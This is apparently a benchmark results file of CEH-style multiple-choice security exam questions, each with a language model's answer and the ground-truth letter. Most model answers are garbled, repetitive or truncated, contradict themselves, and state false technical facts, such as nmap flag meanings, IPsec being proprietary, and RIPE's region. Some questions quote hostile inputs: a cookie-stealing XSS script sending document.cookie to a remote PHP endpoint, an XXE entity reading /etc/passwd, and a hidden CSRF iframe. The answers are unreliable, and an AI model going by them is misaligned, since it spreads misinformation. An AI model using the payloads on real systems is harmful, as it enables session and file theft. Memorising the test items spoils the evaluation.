index,question,llm_answer,ground_truth
76,"In an attempt to damage the reputation of a competitor organization, Hailey, a professional hacker, gathers a
list of employee and client email addresses and other related information by using various search engines,
social networking sites, and web spidering tools. In this process, she also uses an automated tool to gather a
list of words from the target website to further perform a brute-force attack on the previously gathered email
addresses.
What is the tool used by Hailey for gathering a list of words from the target website?
A.  Shadowsocks
B.  CeWL
C.  Psiphon
D.  Orbot
","The tool used to gather a list of words is CeWL, which is a tool that can gather a list of words from a target website
and then use those words as a starting point for a brute-force attack. This is a common practice in hacking, and it is
used to gather information from websites to use in a brute-force attack. In this case, the tool is used to gather a list
of words from a website, which can then be used to launch a brute-force attack. The tool is also used to gather
information from social networking sites, but it is not used for gathering words from a website.
A, B, D. CeWL is a tool that gathers a list of words from a target website. It is used to gather information from
a website, but it is not used for gathering words from a website.
CEH Certified Ethical Hacker Practice Exams
A, B, D. Orbot is a tool used to help users access the",B
77,"On performing a risk assessment, you need to determine the potential impacts when some of the critical
business processes of the company interrupt its service.
What is the name of the process by which you can determine those critical businesses?
A.  Emergency Plan Response (EPR)
B.  Business Impact Analysis (BIA)
C.  Risk Mitigation
D.  Disaster Recovery Planning (DRP)
","This is a question about cybersecurity. Please write an answer.

  A. The Business Impact Analysis (BIA) is the process by which you determine the potential impacts when some of the critical
business processes of the company interrupt its service. BIA is used as a business continuity and business
resilience planning tool.
A BIA is a process by which you determine the potential impacts when some of the critical business processes of the
company interrupt its service. BIA is used as a business continuity and business resilience planning tool.
BIA is not a disaster recovery plan.
A disaster recovery plan is a document that outlines the steps to be taken in the event of a disaster.
A business impact analysis is a process by which you determine the potential impacts when some of the critical
business processes of the company interrupt its service.
A business continuity plan is a document that outlines the steps to be taken in the event of a business
continuity incident.
A business continuity plan is a document that",B
78,"You are a penetration tester and are about to perform a scan on a specific server. The agreement that you
signed with the client contains the following specific condition for the scan: ?The attacker must scan every
port on the server several times using a set of spoofed sources IP addresses. ? Suppose that you are using
Nmap to perform this scan. What flag will you use to satisfy this requirement?
A.  The -A flag
B.  The -g flag
C.  The -f flag
D.  The -D flag
","Question:
A. This is a bit of a tricky one, and one that you will see on the exam. In the question, you’re asked to
specify the flag that you will use to satisfy the condition that the attacker must scan every port on the server
several times. In this case, the -A flag is used for performing a SYN scan, which is the most common type of
attack used in the social engineering arena. The -A flag is not used for scanning every port on the server.
A and B are incorrect because the -g flag is used to specify the number of packets to send, and the -f flag is used
to specify the number of packets to receive. The -D flag is used to specify the number of threads to use.
A is incorrect because the -f flag is used to specify the number of threads to use. The -D flag is not used for
scanning. The -D flag is used to specify the",D
79,"You are a security officer of a company. You had an alert from IDS that indicates that one PC on your Intranet
is connected to a blacklisted IP address (C2 Server) on the Internet. The IP address was blacklisted just before
the alert. You are starting an investigation to roughly analyze the severity of the situation. Which of the
following is appropriate to analyze?
A.  IDS log
B.  Event logs on domain controller
C.  Internet Firewall/Proxy log.
D.  Event logs on the PC
","Question: C. The event logs on the domain controller will provide information about events on the domain, which may or may not
include information about the IP addresses you are looking for. The Internet firewall/proxy logs will have information about
traffic going in and out of the domain. The IDS log will have information about events on the domain, which may or may not
include information about the IP addresses you are looking for. The event logs on the PC will not have any information about
the IP addresses you are looking for. The only place to look for information about IP addresses is the Internet firewall/proxy
log. The event logs on the domain controller will not provide information about the IP addresses you are looking for. The
only place to look for information about the IP addresses you are looking for is the Internet firewall/proxy log. If you want
to look for information about the IP addresses you are looking for, you would use the event logs on the PC.
A,",C
80,"Jack, a disgruntled ex-employee of Incalsol Ltd., decided to inject fileless malware into Incalsol's systems. To
deliver the malware, he used the current employees' email IDs to send fraudulent emails embedded with
malicious links that seem to be legitimate. When a victim employee clicks on the link, they are directed to a
fraudulent website that automatically loads Flash and triggers the exploit. What is the technique used byjack to
launch the fileless malware on the target systems?
A.  In-memory exploits
B.  Phishing
C.  Legitimate applications
D.  Script-based injection
","B. Script-based injection is the technique used by Jack to launch the fileless malware on the target systems. Script-based
injection is when a program is injected into the target system using a program that runs in the background and is
controlled by a script. The script is used to launch the exploit. The script is executed by the operating system and
does not need to be installed on the target system. The script is not embedded with a malicious link. Script-based
injection is not used in fileless malware attacks.
A is incorrect because an in-memory exploit is used in fileless malware attacks. An in-memory exploit is a program that
injects code into the target system and runs it without the need for a bootable media. The program is injected into
memory, and the system is rebooted, allowing the exploit to run.
C is incorrect because phishing is not used in fileless malware",B
81,"George, an employee of an organization, is attempting to access restricted websites from an official computer.
For this purpose, he used an anonymizer that masked his real IP address and ensured complete and continuous
anonymity for all his online activities. Which of the following anonymizers helps George hide his activities?
A.  https://www.baidu.com
B.  https://www.guardster.com
C.  https://www.wolframalpha.com
D.  https://karmadecay.com
","Question: A. The best choice here is  https://www.guardster.com. This is an anonymizer that is designed to
hide your IP address and make it appear as if you are in a different location. It does not provide access to restricted
sites, and it doesn’t offer the same features as a proxy. It also doesn’t encrypt your traffic, which is important for
anonymity. It’s a good choice for anyone who wants to make sure their traffic is not traced back to them.
B is incorrect because  https://karmadecay.com is a website that provides access to restricted sites.
C is incorrect because  https://wolframalpha.com is a website that provides access to a variety of math-related
information.
D is incorrect because  https://www.wolframalpha.com is a website that provides access to a variety of math-related
information. It does not provide access to restricted sites.",B
82,"Which wireless security protocol replaces the personal pre-shared key (PSK) authentication with Simultaneous
Authentication of Equals (SAE) and is therefore resistant to offline dictionary attacks?
A.  WPA3-Personal
B.  WPA2-Enterprise
C.  Bluetooth
D.  ZigBee
","# C. WPA3-Personal is a WPA3 protocol that is the successor to WPA2-Personal, which was the successor to WPA2-Enterprise. It provides enhanced security by using a Shared Key Authentication Protocol (SAE) for authentication. SAE is a method of using a key exchange to authenticate users. SAE is designed to be resistant to offline dictionary attacks. The other protocols listed are not. Bluetooth is a wireless technology that uses radio waves to communicate. Zigbee is a low-power wireless technology that is used for low-power, low-latency, and low-cost networking. It is not a security protocol.",A
83,"When you are testing a web application, it is very useful to employ a proxy tool to save every request and
response. You can manually test every request and analyze the response to find vulnerabilities. You can test
parameter and headers manually to get more precise results than if using web vulnerability scanners.
What proxy tool will help you find web vulnerabilities?
A.  Maskgen
B.  Dimitry
C.  Burpsuite
D.  Proxychains
","Question: A. Proxychains is a tool that can be used to set up a proxy server for a test. It can be used to save
every request and response to the file for analysis. It is a proxy server that uses HTTP and HTTPS to communicate
with the server. It doesn’t do anything with the data, so it doesn’t do any of the scanning you would do
with a scanner. It doesn’t have a built-in vulnerability scanner. It does, however, have a built-in
proxy server. This is a very useful tool for testing a web application. Maskgen is a tool for generating
passwords. Dimitry is a tool for generating dynamic content. Burpsuite is a tool for testing web applications.
Proxychains is a tool for setting up a proxy server. It doesn’t do anything with the data, so it doesn’t do
any of the scanning you would do with a scanner. It doesn’t have a built-in vulnerability scanner. It",C
84,"A ""Server-Side Includes"" attack refers to the exploitation of a web application by injecting scripts in HTML
pages or executing arbitrary code remotely.
Which web-page file type, if it exists on the web server, is a strong indication that the server is vulnerable to
this kind of attack?
A.  .stm
B.  .html
C.  .rss
D.  .cms
","This is a question about cybersecurity. Please write an answer.

 B is incorrect because the.css file type is used for Cascading Style Sheets, which are used to style HTML
documents. The.jsp file type is used for Java servlets. The.js file type is used for JavaScript.
A, D, and E are incorrect because the file types listed are not used for web pages.",A
85,"You have compromised a server on a network and successfully opened a shell. You aimed to identify all
operating systems running on the network. However, as you attempt to fingerprint all machines in the network
using the nmap syntax below, it is not going through.
invictus@victim_server.~$ nmap -T4 -O 10.10.0.0/24 TCP/IP fingerprinting (for OS scan) xxxxxxx xxxxxx
xxxxxxxxx. QUITTING!
What seems to be wrong?
A.  The nmap syntax is wrong.
B.  This is a common behavior for a corrupted nmap application.
C.  The outgoing TCP/IP fingerprinting is blocked by the host firewall.
D.  OS Scan requires root privileges.
","This is a very common question on the certification exams. The syntax is incorrect and will not run on a compromised
server. The syntax is as follows:
nmap -T4 -O 10.10.0.0/24
The -T4 indicates TCP port scanning, and -O indicates OS fingerprinting. The -O option is used to get the operating
system fingerprinting. The -T4 option is for TCP port scanning. The -O option is not for OS fingerprinting. The syntax
is incorrect and will not run on a compromised server. The host firewall is blocking the OS scan because it’s
not allowed by default. The OS scan is not blocked by default, so you’d have to add a rule to allow the OS scan
by default. The OS scan is not blocked by default, so you’d have to add a rule to allow the OS scan by default.
The OS scan is not blocked by default, so you’d have to",D
86,"A penetration tester is performing the footprinting process and is reviewing publicly available information
about an organization by using the Google search engine.
Which of the following advanced operators would allow the pen tester to restrict the search to the
organization?s web domain?
A.  [allinurl:]
B.  [location:]
C.  [site:]
D.  [link:]
","# A is incorrect because the allinurl operator is used to search for information on the Internet. The
location operator is used to search for information within a domain. The site operator is used to search for
information on a specific website. The link operator is used to search for information on a specific
website. The allinurl: operator restricts the search to information on a specific domain. The site: operator
restricts the search to information on a specific website. The link: operator restricts the search to information
on a specific website. The location: operator is used to restrict the search to information within a specific
domain. The location: operator is used to restrict the search to information within a specific location.
The link: operator is used to restrict the search to information on a specific website.
A and C are incorrect because the allinurl: operator restricts the search to information on a specific domain. The
site: operator restricts the search to information",C
87,"Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices.
Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic
information about their network. When analyzing the results of her Whois search, Becky notices that the IP
was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for
detailed information?
A.  ARIN
B.  APNIC
C.  RIPE
D.  LACNIC
","The regional Internet registry that Becky should use to obtain information about the IP address is RIPE. RIPE is
the regional Internet registry for the European Union. RIPE is the second largest Internet registry in the world. It is
also the largest by number of members. RIPE is a member of the Internet Architecture Board (IAB). RIPE
is the only regional Internet registry that does not have a regional top-level domain name, so it does not have
its own TLD. RIPE is responsible for the management of the Internet infrastructure in Europe and is responsible for
the European Internet. The RIPE region includes the countries of Belgium, France, Germany, Luxembourg, the Netherlands,
Norway, and Switzerland. RIPE is not the regional Internet registry for the United States.
A is incorrect because APNIC is the regional Internet registry for Australia and New Zealand. APNIC is the
largest Internet registry in the world, with 5,000 members. APNIC",C
88,"A company?s Web development team has become aware of a certain type of security vulnerability in their
Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the
software requirements to disallow users from entering HTML as input into their Web application.
What kind of Web application vulnerability likely exists in their software?
A.  Cross-site scripting vulnerability
B.  SQL injection vulnerability
C.  Web site defacement vulnerability
D.  Gross-site Request Forgery vulnerability
","The SQL injection vulnerability exists in the Web application and allows the attacker to inject SQL statements
into the Web application to gain unauthorized access to the database. Web site defacement vulnerability is
a vulnerability that allows an attacker to deface the site in some way. Gross-site Request Forgery is a vulnerability
that allows an attacker to exploit the fact that the Web application may be sending a request to the browser to
request a file, and then the attacker can modify the request and get the application to do something it
otherwise would not do. This is not a vulnerability, but it is a related one. The Web application team wants to
prevent the HTML from being entered into the Web application. This is not a vulnerability, but it is a related one.
The Web application is being modified to prevent HTML from being entered into the application. This is not a
vulnerability, but it is a related one. A cross-site scripting vulnerability allows an attacker to inject HTML into
the",A
89,"Which of the following provides a security professional with most information about the system?s security
posture?
A.  Phishing, spamming, sending trojans
B.  Social engineering, company site browsing tailgating
C.  Wardriving, warchalking, social engineering
D.  Port scanning, banner grabbing service identification
","C. This is the best question. It includes all the items that are associated with social engineering. It’s a good
example of a social engineering attack, and it’s also a good example of a warchalking.
A, B, and D are incorrect because these don’t include social engineering or warchalking. Social
engineering is a term used to describe the process of gaining access to systems by pretending to be someone
else. It’s a broad term that includes a number of tactics, but the main one is impersonation. Warchalking
is a term used for the practice of leaving a trail of clues to lead a hacker to a target. A banner grabbing
service is a tool that scans the web to identify open ports and open services. Port scanning is a tool that
can be used to identify open ports on a system. This is not a social engineering attack. The term phishing",D
90,"BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are
concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to
recover the keys from Active Directory. What is this mechanism called in cryptography?
A.  Key archival
B.  Key escrow.
C.  Certificate rollover
D.  Key renewal
","# B. The certificate rollover is a method used to keep the keys current. It’s used in the PKI and is
basically a method of rotating keys. In other words, the certificate is renewed. The key archival method is
a way to store keys and provide a backup. Key escrow is a way to provide access to the keyholder in
case of a loss of key. Key renewal is a method used to update keys. None of these are the correct
answers for this question. The key archival method is used for a different purpose than the key escrow.
The key renewal method is used to keep keys current. The certificate rollover method is used to rotate
keys. The key escrow method is used to provide access to the keyholder in case of a loss of key.",B
91,"What would be the purpose of running ""wget 192.168.0.15 -q -S"" against a web server?
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all the contents of the web page locally for further examination
","This is a simple question about web security. The purpose of this command is to perform content enumeration
on the web server. This is done by using the -q switch to disable output and the -S switch to
search for all the files on the server. The -q switch also tells wget to not display any output.
The -S switch is used to search for all files on the server. The -q switch is used to disable output,
and the -S switch is used to search for all files on the server. The -q switch is used to disable
output, and the -S switch is used to search for all files on the server. The -q switch is used to
disable output, and the -S switch is used to search for all files on the server. The -q switch is used
to disable output, and the -S switch is used to search for all files on the server. The -q switch is used
to disable output,",B
92,"Judy created a forum, one day. she discovers that a user is posting strange images without writing comments.
She immediately calls a security expert, who discovers that the following code is hidden behind those images:
<script>
document.writef<img src=""https://Ioca(host/submitcookie.php? cookie ='+ escape(document.cookie)+ "" />);
</script>
What issue occurred for the users who clicked on the image?
A.  The code inject a new cookie to the browser.
B.  The code redirects the user to another site.
C.  The code is a virus that is attempting to gather the users username and password.
D.  This php file silently executes the code and grabs the users session cookie and session ID.
","This is a simple example of an XSS vulnerability. The script is inserted into the page using the
document.write() method. The code in the script grabs the cookie and the session ID and then sends them
to the server. The server can use the session ID to track the user. The user can then be tricked into
submitting personal information to the server. In this case, the server would receive the user’s cookie and
session ID, and the user would be taken to the site without any warning or explanation. The code
in the script is designed to be executed on the server, not on the client. The code is also designed to
execute the script in a browser, not a server. The script is designed to grab the cookie and session ID
from the client, and then send them to the server. The script is designed to execute the script on the
server, not the client. The script is designed to grab the cookie and session ID from the",D
93,"Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides
additional routing information in the SOAP header to support asynchronous communication. This further
allows the transmission of web-service requests and response messages using different TCP connections.
Which of the following attack techniques is used by Stella to compromise the web services?
A.  XML injection
B.  WS-Address spoofing
C.  SOAPAction spoofing
D.  Web services parsing attacks
","This is a trick question. The answer is B. WS-Address spoofing is used to change the address of the web service
being called, but it’s not used to compromise the web service. XML injection is used to inject malicious code
into the XML message being sent to the web service. SOAPAction spoofing is used to change the SOAPAction
header, which is used to indicate the web service being called. Web services parsing attacks are used to
attempt to parse the web service to obtain information about it. None of these attack techniques are used to
compromise the web service.",B
94,"If executives are found liable for not properly protecting their company?s assets and information systems, what
type of law would apply in this situation?
A.  Criminal
B.  International
C.  Common
D.  Civil
","This is a common question, but the answer isn’t always straightforward. This is a question about
law, but it isn’t a legal question. The law of the land can have a bearing on what liability would apply in a given
situation, but it doesn’t have anything to do with the question. The question is asking you to identify the type of law
that would apply to this scenario. The answer is a bit complicated because the law is all over the place.
However, the civil law of the United States would apply to this scenario. The criminal law of the United States
wouldn’t apply, as this is an international case. The common law of the United States would also not apply,
as it would be a civil case. The answer is a civil law question, though, and the law of the land is the civil law of the
United States, which is the law that applies to this scenario. The law of the land is the one you need to",D
95,"An attacker changes the profile information of a particular user (victim) on the target website. The attacker
uses this string to update the victim?s profile to a text file and then submit the data to the attacker?s database.
<
iframe src=??http://www.vulnweb.com/updateif.php?? style=??display:none??
> < /iframe >
What is this type of attack (that can use either HTTP GET or HTTP POST) called?
A.  Browser Hacking
B.  Cross-Site Scripting
C.  SQL Injection
D.  Cross-Site Request Forgery
","Question: D. Cross-Site Request Forgery (CSRF) is a type of attack that exploits a flaw in the way a web application
processes user input. The attacker sends a request to the server, which sends back a response to the browser. The
browser then uses the response to update the user’s session information. The attacker can then submit false data to the
server, which can be used to update the user’s session information, and the user will be affected by the false data.
This attack can be used to perform a variety of actions, such as:
• Spoofing a user
• Accessing restricted resources
• Administering a remote command
• Submitting data to an application
• Stealing session cookies
• Exploiting a vulnerability in a web application
In this attack, the attacker sends a request to the server, which sends back a response to the browser. The browser then uses the response to update the user’s session information",D
96,"You start performing a penetration test against a specific website and have decided to start from grabbing all
the links from the main page.
What Is the best Linux pipe to achieve your milestone?
A.  dirb https://site.com | grep ""site""
B.  curl -s https://sile.com | grep ??< a href-\?http"" | grep ""Site-com- | cut -d ""V"" -f 2
C.  wget https://stte.com | grep ""< a href=\*http"" | grep ""site.com""
D.  wgethttps://site.com | cut-d""http-
","This is a good question, but I’m going to have to disagree with you on the best option. The first two are not
valid options because they do not contain a pipe. The third option is incorrect because it is using curl to grab
the page, but it is not using a pipe. The fourth option is incorrect because wget is used to download
a file, not a web page. The fifth option is incorrect because it is using a grep command to grab links.
In all other respects, these are all incorrect. The best option is curl, which is used to download the
page. However, you can’t just grab all the links from the main page. You need to filter for the link that
you want. If you want to grab all links, you would use grep, not a pipe. If you want to grab all links
with the word “site” in them, you would use grep. If you want to grab all links that are links to",C
97,"Upon establishing his new startup, Tom hired a cloud service provider (CSP) but was dissatisfied with their
service and wanted to move to another CSP.
What part of the contract might prevent him from doing so?
A.  Virtualization
B.  Lock-in
C.  Lock-down
D.  Lock-up
","D. Lock-up is the last part of the contract that prohibits the customer from terminating the contract without
a penalty. In this case, the customer is not allowed to terminate the contract without a penalty, but there is no
restriction on the CSP. This is because the contract is in the virtualization stage. The customer has no
control over the virtualization infrastructure, so there is no physical infrastructure to terminate. Lock-in refers to
the inability of the customer to move to another CSP without breaking the contract. In this case, the customer
cannot move without a penalty. Lock-down refers to the ability of the customer to control the virtualization
infrastructure. In this case, the customer can control the virtualization infrastructure, so there is no lock-down. Virtualization
is the ability of the customer to manage the virtualization infrastructure. In this case, the customer can manage
the virtualization infrastructure",B
98,"In both pharming and phishing attacks, an attacker can create websites that look similar to legitimate sites with
the intent of collecting personal identifiable information from its victims.
What is the difference between pharming and phishing attacks?
A.  In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
B.  In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name
C.  Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
D.  Both pharming and phishing attacks are identical
","The difference between the two is the method of attack. In a pharming attack, the attacker creates a website that looks like a legitimate website, but the URL is misspelled or similar to the actual site. In a phishing attack, the attacker provides the victim with a URL that is either misspelled or looks similar to the actual website. The attacker does not create the site himself or herself, but instead uses a service provider to host the site. The service provider is responsible for providing the URL to the victim, and the attacker simply provides the victim with the URL.
A is incorrect because in a pharming attack, the attacker does not collect personal information from the victim. In a phishing attack, the attacker collects personal information from the victim.
C is incorrect because in a pharming attack, the attacker does not collect personal information from the victim. In a phishing attack, the attacker provides the victim with a URL that is either misspelled or looks similar to the actual website.",A
99,"Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity
and navigate anonymously to obtain sensitive/hidden information about official government or federal
databases. After gathering the Information, he successfully performed an attack on the target government
organization without being traced. Which of the following techniques is described in the above scenario?
A.  Dark web footprinting
B.  VoIP footpnnting
C.  VPN footprinting
D.  website footprinting
","This is a trick question.  You may think that it’s a trick question because the answer is in the question. However, it’s not. The
answer is D.  VoIP is a protocol that allows you to place voice calls over the Internet.  It’s not a search engine, and it’s
not a way to “footprint” a website.  This is a question about cyber security.  The answer is D.  This is a question about
information security, not information gathering.  The other answers are incorrect because they are not true.  Dark web footprinting
is a technique used to gather information about the dark web.  VoIP is a protocol used for voice communication over the
Internet.  VPN is a protocol used for creating virtual private networks, and website footprinting is a technique used to
identify and track web activity.  The information gathering question is asking you to identify the different techniques used
to gather information, and all",A
100,"When considering how an attacker may exploit a web server, what is web server footprinting?
A.  When an attacker implements a vulnerability scanner to identify weaknesses
B.  When an attacker creates a complete profile of the site's external links and file structures
C.  When an attacker gathers system-level data, including account details and server names
D.  When an attacker uses a brute-force attack to crack a web-server password
","This is a question about cybersecurity. Please write an answer.

 A, B, C, D. web server footprinting is a method used by attackers to gather information about a
server’s system configuration, including the operating system, installed software, and
hardware configuration. This information is gathered through various means, including
monitoring network traffic, using tools such as netstat and nmap, and even by
running a vulnerability scanner. Web server footprinting is often used to identify weaknesses
in the configuration of web servers, and is a common method used by attackers to gain
access to sensitive information on a server. In addition to gathering information about the
operating system and installed software, web server footprinting can also include gathering
information about the network traffic, including the protocol and port numbers being used.
This is done by using tools such as nmap or nmap-ng, which are designed specifically
for this purpose. Web server footprinting can also be used to gather information",B
101,"Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP
header and the related TCP window size and obtained the following results:
TTL: 64 Window Size: 5840
What is the OS running on the target machine?
A.  Solaris OS
B.  Windows OS
C.  Mac OS
D.  Linux OS
","The initial TTL in the IP header is an aging mechanism that indicates the number of times the packet has been
delivered to a router. The window size is a TCP window size, which is the number of bytes available for
sending. In this case, the window size is 5840 bytes. The OS is Linux. The TTL and window size are not
indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
indicators of the OS running on the target machine. The OS is Linux. The TTL and window size are not
indicators of the OS",D
102,"Which protocol is used for setting up secure channels between two devices, typically in VPNs?
A.  PEM
B.  ppp
C.  IPSEC
D.  SET
","This is a question about cybersecurity. Please write an answer.

 C. IPsec is the protocol used in VPNs. It’s a security protocol that uses encryption and key exchange to establish a secure channel between two devices. The protocol is designed to be used over an IP network, but can also be used over other types of networks. It is a proprietary protocol, meaning that it is not open source. PEM is a format used to encrypt data, and it is not a protocol used in VPNs. SET is a protocol used in set-up and teardown of VPN connections. PPP is a protocol used for setting up a connection between two devices. It is not used for security purposes and is not open source.",C
103,"Peter, a system administrator working at a reputed IT firm, decided to work from his home and login remotely.
Later, he anticipated that the remote connection could be exposed to session hijacking. To curb this possibility,
he implemented a technique that creates a safe and encrypted tunnel over a public network to securely send
and receive sensitive information and prevent hackers from decrypting the data flow between the endpoints.
What is the technique followed by Peter to send files securely through a remote connection?
A.  DMZ
B.  SMB signing
C.  VPN
D.  Switch network
","This is a question about cybersecurity. Please write an answer.

 A, B, D. A DMZ is a virtual network that provides a network for public-facing services, such as web servers and
mail servers. The DMZ is created by placing a firewall on the outside of the network, with the purpose of
allowing traffic from the outside world to reach the internal network without being blocked by the firewall. The
firewall is set up to allow access to the DMZ, and all traffic is encrypted. The DMZ is used to provide a
secure, encrypted connection to internal networks and to allow the public to access internal systems. It is
not used for sensitive information transfer. The VPN is a virtual private network, which is a secure network
created over the public internet. The VPN uses encryption and authentication to provide a secure connection
between two computers. The switch network is a physical network that connects multiple switches together. The
switches are connected to a network switch",C
104,"Which of the following web vulnerabilities would an attacker be attempting to exploit if they delivered the
following input?
<!DOCTYPE blah [ < IENTITY trustme SYSTEM ""file:///etc/passwd"" > ] >
A.  XXE
B.  SQLi
C.  IDOR
D.  XXS
","This is a bit of a tough one. The XXE vulnerability is a remote code execution vulnerability that occurs when a user
provides an input string to a web application that is expecting it to be a valid XML file. The system then
uses that input string to create a shell command that is executed on the server. It’s a bit of a catch-22, because the
system needs to be able to accept XML, but the user is expected to provide a valid XML file. This is a bit
of a difficult one because there are so many potential answers. The best way to think about it is to remember that
XML is a markup language, and markup languages are used to add structure to a document. This is a bit like
using HTML to describe a document. The system needs to be able to parse the XML and understand the structure.
If the system is expecting XML, and the user provides an input string that is not valid XML, the system will
not",A
105,"While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to
determine whether the firewall is stateful or stateless, which of the following options would be best to use?
A.  -sA
B.  -sX
C.  -sT
D.  -sF
","This is a question about cybersecurity. Please write an answer.

 A, B, C, D.  -sA is a command that sends ICMP echo packets to the target host and returns the number of responses
received. It is used for testing stateless firewalls.
A, B, C, D is incorrect because the -sT flag is used to test for stateful firewalls. A stateful firewall will respond to a SYN
request with an RST packet and an ICMP error message. A stateless firewall will respond with an ICMP message. The -sF
flag is used to test for both stateful and stateless firewalls. The -sX flag is used to test for ICMP fragmentation. This flag
is used to test for ICMP fragmentation, which can be used to test for stateful firewalls. The -sS flag is used to test for TCP
stateful firewalls. This flag is used to test for TCP stateful firewalls.",A
106,"What type of virus is most likely to remain undetected by antivirus software?
A.  Cavity virus
B.  Stealth virus
C.  File-extension virus
D.  Macro virus
","This is a question about cybersecurity. Please write an answer.

  A, B, C, D. A cavity virus is a virus that uses a hidden file to infect a system. The file is
embedded in a file with a known extension (such as.exe or.dll), and it can be hidden
in a way that it doesn’t show up in the Windows virus scanner. The file can be placed
in a directory and not show up as a virus, or it can be placed in a file with a known extension
and not show up in the virus scanner. It’s not a macro virus, because it doesn’t use a macro
file to infect a system.
B is incorrect because a stealth virus is a virus that hides itself from the antivirus software.
C is incorrect because a file-extension virus doesn’t exist.
D is incorrect because a macro virus is a virus that uses a macro file to infect a system. A macro
file is a program that can be",B
107,"Which of the following types of SQL injection attacks extends the results returned by the original query,
enabling attackers to run two or more statements if they have the same structure as the original one?
A.  Error-based injection
B.  Boolean-based blind SQL injection
C.  Blind SQL injection
D.  Union SQL injection
","# A, B, D. Error-based injection is a type of SQL injection attack in which the SQL code is designed to produce a
error message, and the attacker uses the error message to manipulate the SQL code to achieve his or her goal. Boolean-based
blind SQL injection is a type of SQL injection in which the attacker uses a boolean expression as part of the SQL code.
This allows the attacker to manipulate the SQL code to achieve his or her goal. Union SQL injection is a type of SQL injection
in which the attacker uses two or more SQL statements to achieve his or her goal. In this case, the attacker uses the
result of the original query to create a new query that produces the desired result. This is a common method for
carrying out SQL injection attacks. The original query is a single query, but the second query is a union of the original
query and the results of the original query. This is a common method for carrying out SQL injection attacks.",D
108,"To hide the file on a Linux system, you have to start the filename with a specific character. What is the
character?
A.  Exclamation mark (!)
B.  Underscore (_)
C.  Tilde H
D.  Period (.)
","D.  The period is used to hide the file name. The period is not a special character in Linux filenames. A tilde is used to
change the case of the file name. An exclamation mark is used to change the case of the file name. A tilde is used
to change the case of the file name. A tilde is used to change the case of the file name. A tilde is used to change
the case of the file name. A tilde is used to change the case of the file name. A tilde is used to change the case
of the file name. A tilde is used to change the case of the file name. A tilde is used to change the case of the file
name. A tilde is used to change the case of the file name. A tilde is used to change the case of the file name.",D
109,"Bob, your senior colleague, has sent you a mail regarding a deal with one of the clients. You are requested to
accept the offer and you oblige. After 2 days, Bab denies that he had ever sent a mail. What do you want to
??know?? to prove yourself that it was Bob who had send a mail?
A.  Non-Repudiation
B.  Integrity
C.  Authentication
D.  Confidentiality
","A, B, D. The mail was not sent by Bob, so you can’t use non-repudiation to prove it. Bob was a
reliable party, so you can’t use integrity to prove it. Authentication is not applicable. Confidentiality is
not applicable here, because the mail was not sent to you. Therefore, you can’t use confidentiality as an
argument. The only thing left is authentication, and that’s what you have to use to prove it. You can’t
use any of the other options. The mail was sent by Bob, so he’s the only person who can prove it, and that
is authentication. Authentication is the only way to prove it.
B is incorrect because non-repudiation is not applicable. The mail was not sent by Bob, so you can’t use
non-repudiation to prove it. Bob was a reliable party",A
